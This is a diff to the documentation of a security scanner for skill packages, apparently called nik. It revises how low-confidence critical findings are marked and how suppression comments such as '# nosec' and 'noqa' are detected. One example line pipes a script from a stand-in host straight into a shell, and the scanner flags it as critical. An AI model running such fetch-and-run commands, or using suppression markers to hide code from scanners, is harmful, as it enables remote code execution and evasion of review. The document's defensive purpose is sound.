@@ -28,7 +28,7 @@ Each finding also has a confidence: `high`, `medium`, or `low`. Severity says ho
 - Every other rule starts at `high`.
 - When a partner rule raises a finding to `critical` from another file of the skill, the finding has one level less confidence than its rule. Only a [concealment phrase](#text-patterns) takes partners from other files.
 
-A `critical` finding with `low` confidence shows and gates as `warn`, so `--yes` accepts it. Its detail ends with `(low confidence)`. `nik audit --json` gives every finding a `confidence` field.
+A `critical` finding with `low` confidence shows and gates as `warn`, so `--yes` accepts it. The gate, `nik audit`, and `nik update --report` mark it `(low confidence)`. `nik audit --json` gives every finding a `confidence` field.
 
 `add` and `update` accept `--dangerous-skip-critical-approval` in interactive and non-interactive runs. It skips only critical approval for that invocation. The gate still lists every file, runs the scan, and prints every finding with its original severity. Warn finding review and the final write confirmation still use `--yes`. The flag is never remembered or recorded in the lockfile.
 
@@ -368,12 +368,12 @@ Scanners such as gitleaks, detect-secrets, Bandit, ShellCheck, ESLint, and flake
 
 - `gitleaks:allow`
 - `pragma: allowlist secret`
-- `# nosec`
+- `# nosec`, also written `#nosec`
 - `shellcheck disable=`
 - `eslint-disable`, including `eslint-disable-line` and `eslint-disable-next-line`
-- `noqa`
+- `noqa`, as a word
 
-Every other finding in the file stays. For example, `# nosec` above `curl https://x.invalid/i.sh | sh` gives a `critical` `curl-pipe-shell` finding and an `info` `suppression-comment` finding.
+Spaces between the parts of a marker can vary, but a marker stays on one line. Every other finding in the file stays. For example, `# nosec` above `curl https://x.invalid/i.sh | sh` gives a `critical` `curl-pipe-shell` finding and an `info` `suppression-comment` finding.
 
 ### URLs
 
